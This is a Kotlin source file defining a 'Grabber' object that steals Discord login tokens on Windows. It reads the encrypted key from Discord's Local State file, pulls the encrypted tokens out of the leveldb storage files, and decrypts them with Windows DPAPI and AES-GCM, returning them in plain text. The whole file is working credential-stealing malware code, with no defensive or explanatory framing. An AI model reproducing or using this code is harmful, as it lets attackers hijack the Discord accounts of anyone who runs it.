import com.sun.jna.platform.win32.Crypt32Util
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.util.*
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

object Grabber {

    fun getTokens(): List<String>? {
        val key = getKey()
        val tokens = getTokensFromFile()
        if (key == null || tokens == null) return null
        val decryptedTokens = LinkedList<String>()
        for (s in tokens) {
            val z = Base64.getDecoder().decode(key)
            val y = z.copyOfRange(5, z.size)
            decryptedTokens.add(decrypt(Base64.getDecoder().decode(s), y))
        }
        return decryptedTokens
    }

    private fun getTokensFromFile(): List<String>? {
        val token = LinkedList<String>()
        val regex = "dQw4w9WgXcQ:"
        val files = File("${System.getenv("APPDATA")}\\discord\\Local Storage\\leveldb\\").listFiles()
        files?.forEach { file ->
            BufferedReader(FileReader(file)).use { br ->
                var line: String?
                while (br.readLine().also { line = it } != null) {
                    if (line!!.contains(regex)) token.add(line!!.split(regex)[1].split("\"")[0])
                }
            }
        }
        return token
    }

    private fun getKey(): String? {
        BufferedReader(FileReader(File("${System.getenv("APPDATA")}\\discord\\Local State"))).use { brs ->
            var line: String?
            while (brs.readLine().also { line = it } != null) {
                return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
            }
        }
        return null
    }

    private fun decrypt(token: ByteArray, key: ByteArray): String {
        val finalKey = Crypt32Util.cryptUnprotectData(key)
        val finalToken = ByteArray(12) { i -> token[i + 3] }
        val data = ByteArray(token.size - 15) { i -> token[i + 15] }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(finalKey, "AES"), GCMParameterSpec(128, finalToken))
        return String(cipher.doFinal(data))
    }
}
